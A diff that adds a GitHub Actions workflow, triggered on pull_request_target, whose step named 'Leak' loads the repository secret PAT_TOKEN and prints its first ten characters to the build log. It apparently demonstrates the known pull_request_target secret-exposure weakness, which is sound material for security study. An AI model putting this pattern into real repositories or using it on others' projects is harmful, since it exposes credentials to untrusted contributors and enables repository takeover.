@@ -1,0 +1,14 @@
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Leak
+        env:
+          PAT_TOKEN: ${{ secrets.PAT_TOKEN }}
+        run: |
+          echo "This is a completely controlled workflow."
+          echo "${PAT_TOKEN:0:10}"
